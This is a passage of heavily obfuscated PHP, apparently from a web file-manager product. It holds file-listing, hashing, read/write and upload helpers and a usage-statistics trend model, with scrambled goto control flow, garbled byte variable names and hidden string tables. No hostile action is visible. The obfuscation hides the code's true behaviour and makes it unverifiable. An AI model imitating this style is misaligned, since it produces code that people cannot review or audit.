$BáÉ¬•×¯Á[8]; goto EïçÕ°„˜½; c†Å˜†ğ±Ø: closedir($aÂïì§‹ŒË); goto Fßëù‹†×¦; EïçÕ°„˜½: if ($cÎåÜ‡²Éà) { $bŞğ‚ì¶…é = $this->iconvSystem($bŞğ‚ì¶…é); } if (!($aÂïì§‹ŒË = @opendir($bŞğ‚ì¶…é))) { return; } while (($E“–‰ÔñŒ = readdir($aÂïì§‹ŒË)) !== !1) { if ($E“–‰ÔñŒ == $BáÉ¬•×¯Á[91] || $E“–‰ÔñŒ == $BáÉ¬•×¯Á[1212]) { continue; } $fèâŠâ‹‚ñ = $bŞğ‚ì¶…é . $E“–‰ÔñŒ; if (is_file($fèâŠâ‹‚ñ) || is_link($fèâŠâ‹‚ñ)) { $B†äÍìƒ‚¨[$BáÉ¬•×¯Á[78]]++; $B†äÍìƒ‚¨[$BáÉ¬•×¯Á[77]] += filesize_64($fèâŠâ‹‚ñ); } else { if (is_dir($fèâŠâ‹‚ñ)) { $B†äÍìƒ‚¨[$BáÉ¬•×¯Á[79]]++; $this->infoChildren($fèâŠâ‹‚ñ, $B†äÍìƒ‚¨, !1); } } } goto c†Å˜†ğ±Ø; Fßëù‹†×¦: } private function folderInfo($c¢¿Š›³İ‹, $F†ºËôî = false) { $Cë¸Æíì°‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $c¢¿Š›³İ‹ = rtrim($c¢¿Š›³İ‹, $Cë¸Æíì°‚[8]) . $Cë¸Æíì°‚[8]; $D î…Ç‘” = $this->iconvApp($this->pathThis($c¢¿Š›³İ‹)); if ($F†ºËôî) { return array($Cë¸Æíì°‚[28] => $D î…Ç‘”, $Cë¸Æíì°‚[75] => $this->getPathOuter($c¢¿Š›³İ‹), $Cë¸Æíì°‚[29] => $Cë¸Æíì°‚[76]); } $dä÷Üš¿ó = array($Cë¸Æíì°‚[28] => $D î…Ç‘”, $Cë¸Æíì°‚[75] => $this->getPathOuter($c¢¿Š›³İ‹), $Cë¸Æíì°‚[29] => $Cë¸Æíì°‚[76], $Cë¸Æíì°‚[190] => @filectime($c¢¿Š›³İ‹), $Cë¸Æíì°‚[107] => @filemtime($c¢¿Š›³İ‹), $Cë¸Æíì°‚[1215] => @fileatime($c¢¿Š›³İ‹), $Cë¸Æíì°‚[1216] => is_readable($c¢¿Š›³İ‹), $Cë¸Æíì°‚[1217] => is_writable($c¢¿Š›³İ‹), $Cë¸Æíì°‚[1218] => get_mode($c¢¿Š›³İ‹)); return $dä÷Üš¿ó; } private function fileInfo($f†¸‹ÚŒ‚Ğ, $AšÀÚî¾Êà = false) { $c¸†ÓÆô½ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $E®êŠ„æ›› = $this->iconvApp($this->pathThis($f†¸‹ÚŒ‚Ğ)); if ($AšÀÚî¾Êà) { return array($c¸†ÓÆô½[28] => $E®êŠ„æ››, $c¸†ÓÆô½[75] => $this->getPathOuter($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[29] => $c¸†ÓÆô½[171], $c¸†ÓÆô½[77] => $this->size($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[165] => $this->ext($E®êŠ„æ››)); } $dšÄî¿ªÅ = array($c¸†ÓÆô½[28] => $E®êŠ„æ››, $c¸†ÓÆô½[75] => $this->getPathOuter($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[29] => $c¸†ÓÆô½[171], $c¸†ÓÆô½[190] => @filectime($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[107] => @filemtime($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[1215] => @fileatime($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[77] => $this->size($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[165] => $this->ext($E®êŠ„æ››), $c¸†ÓÆô½[1216] => is_readable($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[1217] => is_writable($f†¸‹ÚŒ‚Ğ), $c¸†ÓÆô½[1218] => get_mode($f†¸‹ÚŒ‚Ğ)); return $dšÄî¿ªÅ; } public function exist($eà‚’§œãÏ) { $eà‚’§œãÏ = $this->iconvSystem($eà‚’§œãÏ); return @file_exists($eà‚’§œãÏ); } public function isFile($E¢ŒÙÜö³¸) { $E¢ŒÙÜö³¸ = $this->iconvSystem($E¢ŒÙÜö³¸); return @is_file($E¢ŒÙÜö³¸); } public function isFolder($D‹¿—·îÕ) { $D‹¿—·îÕ = $this->iconvSystem($D‹¿—·îÕ); return @is_dir($D‹¿—·îÕ); } public function listPath($Eë¬ñƒğ’ó, $A¢Äïœ¸’Š = false) { goto B¨°·ï©ç›; CŠï £ Îé: closedir($AŠÄò©„âî); return $fÔİää¿åß; goto A˜ÊçŠĞÁ; B¨°·ï©ç›: $fğÎ±øó„÷ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eë¬ñƒğ’ó = $this->iconvSystem($Eë¬ñƒğ’ó); $Eë¬ñƒğ’ó = rtrim($Eë¬ñƒğ’ó, $fğÎ±øó„÷[8]) . $fğÎ±øó„÷[8]; goto AŒ˜ÑÛÆÄÁ; AŒ˜ÑÛÆÄÁ: $fÔİää¿åß = array($fğÎ±øó„÷[74] => array(), $fğÎ±øó„÷[73] => array()); if (!($AŠÄò©„âî = @opendir($Eë¬ñƒğ’ó))) { return $fÔİää¿åß; } while (($BİÆªÆ† = readdir($AŠÄò©„âî)) !== !1) { if ($BİÆªÆ† == $fğÎ±øó„÷[91] || $BİÆªÆ† == $fğÎ±øó„÷[1212]) { continue; } $BõÆ›ŸÅõ = $Eë¬ñƒğ’ó . $BİÆªÆ†; if (is_file($BõÆ›ŸÅõ)) { $fÔİää¿åß[$fğÎ±øó„÷[73]][] = $this->fileInfo($BõÆ›ŸÅõ, $A¢Äïœ¸’Š); } else { $fÔİää¿åß[$fğÎ±øó„÷[74]][] = $this->folderInfo($BõÆ›ŸÅõ, $A¢Äïœ¸’Š); } } goto CŠï £ Îé; A˜ÊçŠĞÁ: } public function listAll($AâÎ¼ŠÉ©È, &$Eˆé‹’¸œ = array()) { goto B·×½Ğê“ğ; B·×½Ğê“ğ: $aÁ»­§¥Òï =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AâÎ¼ŠÉ©È = $this->iconvSystem($AâÎ¼ŠÉ©È); $AâÎ¼ŠÉ©È = rtrim($AâÎ¼ŠÉ©È, $aÁ»­§¥Òï[8]) . $aÁ»­§¥Òï[8]; goto bë­âÕÆÇƒ; A‹Â¨™§§Ò: return $Eˆé‹’¸œ; goto B££šéêÉˆ; bë­âÕÆÇƒ: if (!($eñ˜«¾‚º = @opendir($AâÎ¼ŠÉ©È))) { return $Eˆé‹’¸œ; } while (($cŒÜŸ˜ëÊ¤ = readdir($eñ˜«¾‚º)) !== !1) { if ($cŒÜŸ˜ëÊ¤ == $aÁ»­§¥Òï[91] || $cŒÜŸ˜ëÊ¤ == $aÁ»­§¥Òï[1212]) { continue; } $dÃàøçˆ‡¼ = $AâÎ¼ŠÉ©È . $cŒÜŸ˜ëÊ¤; if (is_dir($dÃàøçˆ‡¼) && !is_link($dÃàøçˆ‡¼)) { $Eˆé‹’¸œ[] = array($aÁ»­§¥Òï[75] => $dÃàøçˆ‡¼ . $aÁ»­§¥Òï[8], $aÁ»­§¥Òï[76] => 1, $aÁ»­§¥Òï[107] => @filemtime($dÃàøçˆ‡¼), $aÁ»­§¥Òï[77] => 0); $this->listAll($dÃàøçˆ‡¼, $Eˆé‹’¸œ); } else { $Eˆé‹’¸œ[] = array($aÁ»­§¥Òï[75] => $dÃàøçˆ‡¼, $aÁ»­§¥Òï[76] => 0, $aÁ»­§¥Òï[107] => @filemtime($dÃàøçˆ‡¼), $aÁ»­§¥Òï[77] => $this->size($dÃàøçˆ‡¼)); } } closedir($eñ˜«¾‚º); goto A‹Â¨™§§Ò; B££šéêÉˆ: } public function has($fÃ…Â‘Ø¿, $AÆï»Äñğ¸ = false, $fæ³ß£‚Ş¼ = true) { goto d¼ô§Ì®¦¶; aÛåîê²±: if ($AÆï»Äñğ¸) { return array($d…É®Ì„ŠÂ[199] => $bÙ£ÎÏ™ø“, $d…É®Ì„ŠÂ[200] => $F«¥øÜöò¾); } return !1; goto F–“ßğª½ô; A‚˜öÚÁ­ì: if (!($Bö¶ºê§œö = @opendir($fÃ…Â‘Ø¿))) { return !1; } $bÙ£ÎÏ™ø“ = 0; $F«¥øÜöò¾ = 0; goto f‡¦Œá¶Ï; f‡¦Œá¶Ï: $E‹ëÜøñªÈ = 0; while (($aøñÄã†Œ = readdir($Bö¶ºê§œö)) !== !1) { if ($aøñÄã†Œ == $d…É®Ì„ŠÂ[91] || $aøñÄã†Œ == $d…É®Ì„ŠÂ[1212]) { continue; } $Bß„Ú…”¢µ = $fÃ…Â‘Ø¿ . $aøñÄã†Œ; if ($AÆï»Äñğ¸) { $E‹ëÜøñªÈ++; if (@is_file($Bß„Ú…”¢µ)) { $bÙ£ÎÏ™ø“++; } else { $F«¥øÜöò¾++; } if ($E‹ëÜøñªÈ > 10000) { break; } continue; } if ($fæ³ß£‚Ş¼) { if (@is_file($Bß„Ú…”¢µ)) { return !0; } } else { if (@is_dir($Bß„Ú…”¢µ . $d…É®Ì„ŠÂ[8])) { return !0; } } } closedir($Bö¶ºê§œö); goto aÛåîê²±; d¼ô§Ì®¦¶: $d…É®Ì„ŠÂ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÃ…Â‘Ø¿ = $this->iconvSystem($fÃ…Â‘Ø¿); $fÃ…Â‘Ø¿ = rtrim($fÃ…Â‘Ø¿, $d…É®Ì„ŠÂ[8]) . $d…É®Ì„ŠÂ[8]; goto A‚˜öÚÁ­ì; F–“ßğª½ô: } public function hashSimple($E»Íó‘„¿) { goto c—Ÿ„ò—Šô; Eˆ–”©Ì³è: $aÇÉå¡ÇË = $this->size($E»Íó‘„¿); $Dµ¶®Ğ’í = 200; $dÍ¤Ü”—‡À = 50; goto Fœƒº‡Šï; Fœƒº‡Šï: if ($aÇÉå¡ÇË <= $Dµ¶®Ğ’í * $dÍ¤Ü”—‡À) { return $this->hashMd5($E»Íó‘„¿) . $aÇÉå¡ÇË; } $AÌ†è¯“Ø± = $bó÷™Ã®ÒÊ[33]; $c‘Ü­ëŒè‰ = intval($aÇÉå¡ÇË / $dÍ¤Ü”—‡À); goto A¸ë¶ÔÙÂø; c—Ÿ„ò—Šô: $bó÷™Ã®ÒÊ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$E»Íó‘„¿) { return md5($bó÷™Ã®ÒÊ[33]); } $E»Íó‘„¿ = $this->iconvSystem($E»Íó‘„¿); goto Eˆ–”©Ì³è; aœ“—Õßë: return md5($AÌ†è¯“Ø±) . $aÇÉå¡ÇË; goto f…ÍÅæ¤Àß; A¸ë¶ÔÙÂø: $D¬ŸÖìß‡ = fopen($E»Íó‘„¿, $bó÷™Ã®ÒÊ[1219]); if (!$D¬ŸÖìß‡) { return $AÌ†è¯“Ø±; } for ($cÕÈ¤¶‰Ô = 0; $cÕÈ¤¶‰Ô < $dÍ¤Ü”—‡À; $cÕÈ¤¶‰Ô++) { fseek_64($D¬ŸÖìß‡, $c‘Ü­ëŒè‰ * $cÕÈ¤¶‰Ô); $AÌ†è¯“Ø± .= fread($D¬ŸÖìß‡, $Dµ¶®Ğ’í); } goto F¶ÔÄ÷æ×­; F¶ÔÄ÷æ×­: fseek_64($D¬ŸÖìß‡, $aÇÉå¡ÇË - $Dµ¶®Ğ’í); $AÌ†è¯“Ø± .= fread($D¬ŸÖìß‡, $Dµ¶®Ğ’í); fclose($D¬ŸÖìß‡); goto aœ“—Õßë; f…ÍÅæ¤Àß: } public function getContent($Fõ‡µÑåèÙ) { $Fõ‡µÑåèÙ = $this->iconvSystem($Fõ‡µÑåèÙ); return file_get_contents($Fõ‡µÑåèÙ); } public function setContent($b¶î¥¨Ôµ, $E¸á¹˜’àë = '') { $b¶î¥¨Ôµ = $this->iconvSystem($b¶î¥¨Ôµ); $eÈÛ¾´‘é = @file_put_contents($b¶î¥¨Ôµ, $E¸á¹˜’àë, LOCK_EX); clearstatcache(); return $eÈÛ¾´‘é === !1 ? !1 : !0; } public function fileSubstr($Bƒ­ºóåÇ, $aîÂÚğçĞ‚ = 0, $cå÷£×ƒ‹ = false) { goto aÑ¨‰œîÒÃ; aÑ¨‰œîÒÃ: $a¼„Õ‚×Ä‹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bƒ­ºóåÇ = $this->iconvSystem($Bƒ­ºóåÇ); if ($cå÷£×ƒ‹ === !1) { $cå÷£×ƒ‹ = $this->size($Bƒ­ºóåÇ); } goto Eç‹¿ †ñ²; AÑ¤ƒ¸ğæ: fseek_64($C´¬çƒ¢œÚ, $aîÂÚğçĞ‚); $Eì‡‰‹©ƒ¬ = fread($C´¬çƒ¢œÚ, $cå÷£×ƒ‹); fclose($C´¬çƒ¢œÚ); goto aƒœ…õŒˆÅ; Eç‹¿ †ñ²: if ($cå÷£×ƒ‹ <= 0) { return $a¼„Õ‚×Ä‹[33]; } $C´¬çƒ¢œÚ = fopen($Bƒ­ºóåÇ, $a¼„Õ‚×Ä‹[1219]); if (!$C´¬çƒ¢œÚ) { return !1; } goto AÑ¤ƒ¸ğæ; aƒœ…õŒˆÅ: return $Eì‡‰‹©ƒ¬; goto C¦òïˆ‡Å§; C¦òïˆ‡Å§: } public function upload($fäÉ¢ËŒğ¨, $båÛôèÔ©…, $Cï¯–¢Î¡” = false, $d±ÊƒÑİ•Ş = REPEAT_REPLACE) { $fÑã›±ƒÔ = $this->copyFile($båÛôèÔ©…, $fäÉ¢ËŒğ¨); return $fÑã›±ƒÔ ? $this->getPathOuter($fäÉ¢ËŒğ¨) : !1; } public function setModifyTime($c‹Š«’îÁ, $b’ÀƒÁ­‰¤ = '') { @touch($c‹Š«’îÁ, intval($b’ÀƒÁ­‰¤)); } public function download($Dó¡Ÿ½º, $fîí½âİÎ‰) { return $this->iconvSystem($Dó¡Ÿ½º); } } goto b¤®Á¼İÄ; bÕï˜°Ç¼Ã: class AnalysisModel extends ModelBaseLight { public function init($C–¿Ä·ÎÄÏ) { $aæšã…ƒ†„ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $EíÜšÊØ® = array($aæšã…ƒ†„[551] => array($aæšã…ƒ†„[29] => $aæšã…ƒ†„[1575], $aæšã…ƒ†„[267] => array($aæšã…ƒ†„[218], $aæšã…ƒ†„[708], $aæšã…ƒ†„[1576], $aæšã…ƒ†„[1577])), $aæšã…ƒ†„[1578] => array($aæšã…ƒ†„[29] => $aæšã…ƒ†„[1579], $aæšã…ƒ†„[267] => array($aæšã…ƒ†„[218], $aæšã…ƒ†„[706], $aæšã…ƒ†„[1580], $aæšã…ƒ†„[1581], $aæšã…ƒ†„[1582]))); if (!isset($EíÜšÊØ®[$C–¿Ä·ÎÄÏ])) { return !1; } $this->optionType = $EíÜšÊØ®[$C–¿Ä·ÎÄÏ][$aæšã…ƒ†„[29]]; $this->field = $EíÜšÊØ®[$C–¿Ä·ÎÄÏ][$aæšã…ƒ†„[267]]; return !0; } public function listData($EÎîÁ“£œÎ = false, $b·¤¢Ù¥İÏ = "\155\157\144\x69\x66\171\124\x69\x6d\x65", $FÓ„¨©İ¬ö = false) { return parent::listData($EÎîÁ“£œÎ, $b·¤¢Ù¥İÏ, $FÓ„¨©İ¬ö); } public function trendList($Aœ¦ºáª¹Š) { goto BßÇòÉğ; BÄµ„º¶: if (!isset($C÷—¥ÓÂà®)) { $d‚Ú’¿Œ¹Ú = $Aœ¦ºáª¹Š == $AÔ„®É™«ğ[551] ? $AÔ„®É™«ğ[494] : $AÔ„®É™«ğ[759]; $C÷—¥ÓÂà® = Model($d‚Ú’¿Œ¹Ú)->min($AÔ„®É™«ğ[190]); } $Cø·ñŠÙÙ = $AÔ„®É™«ğ[1585] . ucfirst($Aœ¦ºáª¹Š); $Fğ‚”ğ§“ = $this->dateList($C÷—¥ÓÂà®); goto aºÔ§ˆšé¨; BßÇòÉğ: $AÔ„®É™«ğ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D¸Á´”ÔŠÄ = $this->listData(); if ($D¸Á´”ÔŠÄ) { $b¬¦Úƒš«¢ = end($D¸Á´”ÔŠÄ); $EàÕÒä±¿ò = date($AÔ„®É™«ğ[1583], strtotime($AÔ„®É™«ğ[1584])); if ($b¬¦Úƒš«¢[$AÔ„®É™«ğ[218]] == $EàÕÒä±¿ò) { return $D¸Á´”ÔŠÄ; } $C÷—¥ÓÂà® = strtotime($b¬¦Úƒš«¢[$AÔ„®É™«ğ[218]]); } goto BÄµ„º¶; aºÔ§ˆšé¨: foreach ($Fğ‚”ğ§“ as $EàÕÒä±¿ò) { $this->{$Cø·ñŠÙÙ}($EàÕÒä±¿ò); } return $this->listData(); goto cóºŸèÊÑ…; cóºŸèÊÑ…: } private function dateList($dœ–—õ¿İ) { $aò…ç‰‰½¶ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cê¯õä†  = $dœ–—õ¿İ; $f†¥ë™Á‡Ù = strtotime($aò…ç‰‰½¶[1584]); $FÏÕòİš† = array(); while ($cê¯õä†  <= $f†¥ë™Á‡Ù) { $FÏÕòİš†[] = date($aò…ç‰‰½¶[1583], $cê¯õä† ); $cê¯õä†  = strtotime($aò…ç‰‰½¶[1586], $cê¯õä† ); } return $FÏÕòİš†; } public function _recordUser($aÜÚîÛŠ‹… = '') { goto c‚”ÁÁÏ¹á; b²ÙÆÊ: $E©—É Àì = array($a÷„ÈñŠ™[218] => $aÜÚîÛŠ‹…, $a÷„ÈñŠ™[708] => (int) $EèáìĞİô÷, $a÷„ÈñŠ™[1576] => (int) $d—ëÊœ›, $a÷„ÈñŠ™[1577] => (int) $d•‚¹åÔº); return $this->insert($E©—É Àì); goto b§Ì·æ¬÷Â; dÕÚµ“ÓĞ: $bÎ¸„’¨º = array($a÷„ÈñŠ™[190] => array($a÷„ÈñŠ™[935], $eÄâ®ÂØî®)); $EèáìĞİô÷ = Model($a÷„ÈñŠ™[494])->where($bÎ¸„’¨º)->count($a÷„ÈñŠ™[1490]); $bÎ¸„’¨º[$a÷„ÈñŠ™[190]] = array($a÷„ÈñŠ™[327], array($cô¡ÀÊŒ—â, $eÄâ®ÂØî®)); goto FæåŸƒ«§; c‚”ÁÁÏ¹á: $a÷„ÈñŠ™ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $cô¡ÀÊŒ—â = strtotime(date($a÷„ÈñŠ™[1587], strtotime($aÜÚîÛŠ‹…))); $eÄâ®ÂØî® = strtotime(date($a÷„ÈñŠ™[1588], strtotime($aÜÚîÛŠ‹…))); goto dÕÚµ“ÓĞ; FæåŸƒ«§: $d—ëÊœ› = Model($a÷„ÈñŠ™[494])->where($bÎ¸„’¨º)->count($a÷„ÈñŠ™[1490]); $bÎ¸„’¨º[$a÷„ÈñŠ™[29]] = $a÷„ÈñŠ™[1589]; $d•‚¹åÔº = Model($a÷„ÈñŠ™[1590])->where($bÎ¸„’¨º)->count($a÷„ÈñŠ™[1591]); goto b²ÙÆÊ; b§Ì·æ¬÷Â: } public function _recordStore($B‘ˆøµêº = '') { goto B´¡Íªä; B´¡Íªä: $eÒ´©»Üå» =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dšµ•öæí„ = strtotime(date($eÒ´©»Üå»[1588], strtotime($B‘ˆøµêº))); $F»šƒÎ°î = array($eÒ´©»Üå»[190] => array($eÒ´©»Üå»[935], $Dšµ•öæí„)); goto BŸ×áÍ‚—; C•Ÿ¡¨›¨ğ: $F»šƒÎ°î[$eÒ´©»Üå»[387]] = 1; $AÉÒÛÔâ¶¿ = Model($eÒ´©»Üå»[759])->where($F»šƒÎ°î)->sum($eÒ´©»Üå»[77]); $F»šƒÎ°î[$eÒ´©»Üå»[387]] = 2; goto CŒŞğÏê„ò; BŸ×áÍ‚—: $aô´Ó¿ƒ¿ = Model($eÒ´©»Üå»[438])->where($F»šƒÎ°î)->sum($eÒ´©»Üå»[77]); $F»šƒÎ°î[$eÒ´©»Üå»[386]] = 0; $EÏ²Õùªº‰ = Model($eÒ´©»Üå»[759])->where($F»šƒÎ°î)->sum($eÒ´©»Üå»[77]); goto C•Ÿ¡¨›¨ğ; CŒŞğÏê„ò: $c‚âğøÚ‘ï = Model($eÒ´©»Üå»[759])->where($F»šƒÎ°î)->sum($eÒ´©»Üå»[77]); $càĞùÍ¢ö´ = array($eÒ´©»Üå»[218] => $B‘ˆøµêº, $eÒ´©»Üå»[706] => (int) $EÏ²Õùªº‰, $eÒ´©»Üå»[1580] => (int) $aô´Ó¿ƒ¿, $eÒ´©»Üå»[1581] => (int) $AÉÒÛÔâ¶¿, $eÒ´©»Üå»[1582] => (int) $c‚âğøÚ‘ï); return $this->insert($càĞùÍ¢ö´); goto EŠ¯“Äè¾; EŠ¯“Äè¾: } public function trend($bŞö µ¿¦, $CŸôà¼  Ş) { goto cŞ¯À©ÕĞñ; BàÉ†ç²: if (empty($FóÆ• íø)) { $c¯£ÁÙŠÎï = date($EîÜÁ¯£Ëè[1583], strtotime($EîÜÁ¯£Ëè[1584])); $EÛÁË…»¹ = array($EîÜÁ¯£Ëè[218] => $c¯£ÁÙŠÎï); foreach ($EÙÁ¤ˆÖˆ¾[$bŞö µ¿¦] as $A±ğÃäÉ‘Ï => $dÏ×¬®¯É) { $EÛÁË…»¹[$A±ğÃäÉ‘Ï] = 0; } $FóÆ• íø[] = $EÛÁË…»¹; } $cÛ²Ğâ×å = array(); foreach ($FóÆ• íø as $dÏ×¬®¯É) { if ($bŞö µ¿¦ == $EîÜÁ¯£Ëè[1578] && $dÏ×¬®¯É[$EîÜÁ¯£Ëè[1580]] > $dÏ×¬®¯É[$EîÜÁ¯£Ëè[706]]) { $dÏ×¬®¯É[$EîÜÁ¯£Ëè[1580]] = $dÏ×¬®¯É[$EîÜÁ¯£Ëè[706]]; } foreach ($EÙÁ¤ˆÖˆ¾[$bŞö µ¿¦] as $A±ğÃäÉ‘Ï => $A’ë©å³‚) { $fêáêĞ‚Ì = array($EîÜÁ¯£Ëè[218] => $dÏ×¬®¯É[$EîÜÁ¯£Ëè[218]], $EîÜÁ¯£Ëè[1395] => $A’ë©å³‚); $fêáêĞ‚Ì[$EÄÈ¨‹Ôª[$bŞö µ¿¦]] = isset($dÏ×¬®¯É[$A±ğÃäÉ‘Ï]) ? $dÏ×¬®¯É[$A±ğÃäÉ‘Ï] : 0; $cÛ²Ğâ×å[] = $fêáêĞ‚Ì; } } goto E³Æ±Ø’”õ; E³Æ±Ø’”õ: return $cÛ²Ğâ×å; goto FÔ²é‡Ÿ‡; cŞ¯À©ÕĞñ: $EîÜÁ¯£Ëè =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->init($bŞö µ¿¦)) { return !1; } $FóÆ• íø = $this->trendList($bŞö µ¿¦); goto FäÁ„Ì‡â; FäÁ„Ì‡â: if ($FóÆ• íø && $CŸôà¼  Ş != $EîÜÁ¯£Ëè[1464]) { $dâˆ¬©ô²ä = $FóÆ• íø[0][$EîÜÁ¯£Ëè[218]]; $D¶…»Á¼Éï = $this->validDate($CŸôà¼  Ş, $dâˆ¬©ô²ä); $f¹˜Áµ¹–© = array(); $d¥ÕÏÎˆÄÜ = array_to_keyvalue($FóÆ• íø, $EîÜÁ¯£Ëè[218]); foreach ($D¶…»Á¼Éï as $c¯£ÁÙŠÎï) { if (isset($d¥ÕÏÎˆÄÜ[$c¯£ÁÙŠÎï])) { $fêáêĞ‚Ì = $d¥ÕÏÎˆÄÜ[$c¯£ÁÙŠÎï]; } else { $fêáêĞ‚Ì = end($FóÆ• íø); $fêáêĞ‚Ì[$EîÜÁ¯£Ëè[218]] = $c¯£ÁÙŠÎï; if ($bŞö µ¿¦ == $EîÜÁ¯£Ëè[551]) { $fêáêĞ‚Ì[$EîÜÁ¯£Ëè[1576]] = $fêáêĞ‚Ì[$EîÜÁ¯£Ëè[1577]] = 0; } } $f¹˜Áµ¹–©[] = $fêáêĞ‚Ì; } $FóÆ• íø = $f¹˜Áµ¹–©; } $EÙÁ¤ˆÖˆ¾ = array($EîÜÁ¯£Ëè[551] => array($EîÜÁ¯£Ëè[708] => LNG($EîÜÁ¯£Ëè[1592]), $EîÜÁ¯£Ëè[1576] => LNG($EîÜÁ¯£Ëè[1593]), $EîÜÁ¯£Ëè[1577] => LNG($EîÜÁ¯£Ëè[1594])), $EîÜÁ¯£Ëè[1578] => array($EîÜÁ¯£Ëè[706] => LNG($EîÜÁ¯£Ëè[1595]), $EîÜÁ¯£Ëè[1580] => LNG($EîÜÁ¯£Ëè[1596]), $EîÜÁ¯£Ëè[1581] => LNG($EîÜÁ¯£Ëè[1597]), $EîÜÁ¯£Ëè[1582] => LNG($EîÜÁ¯£Ëè[1598]))); $EÄÈ¨‹Ôª = array($EîÜÁ¯£Ëè[551] => $EîÜÁ¯£Ëè[1599], $EîÜÁ¯£Ëè[1578] => $EîÜÁ¯£Ëè[77]); goto BàÉ†ç²; FÔ²é‡Ÿ‡: } public function validDate($dÇ©ºóï·, $e¡ŠÑ­¬—) { goto dêæ†×İ„¦; dêæ†×İ„¦: $CğËØÂ´Û• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B™¼éŒ—Ä = date($CğËØÂ´Û•[1583], strtotime($CğËØÂ´Û•[1584])); $A–Íğ‰‚ôê = array($B™¼éŒ—Ä); goto c¸ã˜Û‹ÔÃ; c¸ã˜Û‹ÔÃ: switch ($dÇ©ºóï·) { case $CğËØÂ´Û•[1471]: $DàŸ³Ö¬’Ø = mktime(0, 0, 0, date($CğËØÂ´Û•[1600]), date($CğËØÂ´Û•[1213]) - date($CğËØÂ´Û•[1275]) + 7 - 7, date($CğËØÂ´Û•[1601])); $E•Á›Ù‘ = 0; do { $e®ìåÙ® = date($CğËØÂ´Û•[1583], $DàŸ³Ö¬’Ø - 3600 * 24 * 7 * $E•Á›Ù‘); $A–Íğ‰‚ôê[] = $e®ìåÙ®; $E•Á›Ù‘++; } while ($e¡ŠÑ­¬— < $e®ìåÙ®); break; case $CğËØÂ´Û•[1469]: $E•Á›Ù‘ = 1; do { $F“ÂŞ˜©¦£ = date($CğËØÂ´Û•[1602], strtotime("\x2d\40{$E•Á›Ù‘}\x20\155\x6f\156\164\x68\x73")); $A–Íğ‰‚ôê[] = $F“ÂŞ˜©¦£; $E•Á›Ù‘++; } while ($e¡ŠÑ­¬— < $F“ÂŞ˜©¦£); break; case $CğËØÂ´Û•[1603]: $fôÁ„­Í¯ô = (int) date($CğËØÂ´Û•[1601], strtotime($e¡ŠÑ­¬—)); $aå¶ŒóãÎƒ = (int) date($CğËØÂ´Û•[1601]); if ($fôÁ„­Í¯ô >= $aå¶ŒóãÎƒ) { break; } for ($fôÁ„­Í¯ô; $fôÁ„­Í¯ô < $aå¶ŒóãÎƒ; $fôÁ„­Í¯ô++) { $A–Íğ‰‚ôê[] = $fôÁ„­Í¯ô . $CğËØÂ´Û•[1604]; } break; default: break; } if ($e¡ŠÑ­¬— > end($A–Íğ‰‚ôê)) { array_pop($A–Íğ‰‚ôê); } sort($A–Íğ‰‚ôê); goto bõí¬ôÃâ›; bõí¬ôÃâ›: return $A–Íğ‰‚ôê; goto D…Ò­Ëøğ; D…Ò­Ëøğ: } public function listTable($c…ØÍ¯ŸÜÑ) { $EÌ²–¿Ù‚… = ucfirst($c…ØÍ¯ŸÜÑ); return Model($EÌ²–¿Ù‚…)->listData(); } public function option($D¨±„ë¨Œ) { $c£â½èŸ•¤ = $_SERVER[ÈİÅ¿ÈÈ¥×][1605] . ucfirst($D¨±„ë¨Œ); return $this->{$c£â½èŸ•¤}(); } private function optionUser() { goto aÅ©µÈ²Ùµ; F¡îÁšàšë: $E‡ª§ÍÒ±Ö = Model($f»Á÷ó»È[494])->where($F‡ñø¸¾Ò¢)->count($f»Á÷ó»È[1490]); return array($f»Á÷ó»È[703] => (int) $eÊ†áø’Œ, $f»Á÷ó»È[1609] => (int) ($eÊ†áø’Œ - $dñÖõƒá), $f»Á÷ó»È[1610] => (int) $dñÖõƒá, $f»Á÷ó»È[1611] => (int) $E‡ª§ÍÒ±Ö, $f»Á÷ó»È[1612] => $dÍ¡Îğ‡ÑË); goto E«ÒƒÅ„Œ¿; eõæõ¥±‚à: if (!$dÍ¡Îğ‡ÑË) { $dÍ¡Îğ‡ÑË = 1; } $eŠ¨Â ‰æ = strtotime(date($f»Á÷ó»È[1587])); $F‡ñø¸¾Ò¢ = array($f»Á÷ó»È[1608] => array($f»Á÷ó»È[936], $eŠ¨Â ‰æ)); goto F¡îÁšàšë; aÅ©µÈ²Ùµ: $f»Á÷ó»È =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÊ†áø’Œ = Model($f»Á÷ó»È[494])->count($f»Á÷ó»È[1490]); $dñÖõƒá = Model($f»Á÷ó»È[494])->where($f»Á÷ó»È[1606])->count($f»Á÷ó»È[1490]); goto fæ²ì¢à¼ö; fæ²ì¢à¼ö: $eŠ¨Â ‰æ = strtotime($f»Á÷ó»È[1607]); $F‡ñø¸¾Ò¢ = array($f»Á÷ó»È[1608] => array($f»Á÷ó»È[936], $eŠ¨Â ‰æ)); $dÍ¡Îğ‡ÑË = (int) Model($f»Á÷ó»È[494])->where($F‡ñø¸¾Ò¢)->count($f»Á÷ó»È[1490]); goto eõæõ¥±‚à; E«ÒƒÅ„Œ¿: } private function optionFile() { goto E‰³‰Æ•Ü°; bƒó‹’îƒª: $DÏšªöÎ Î = $dº´ì§› »[$cØÁ»Á£Ò[1580]]; $fäƒäôƒ¬ = 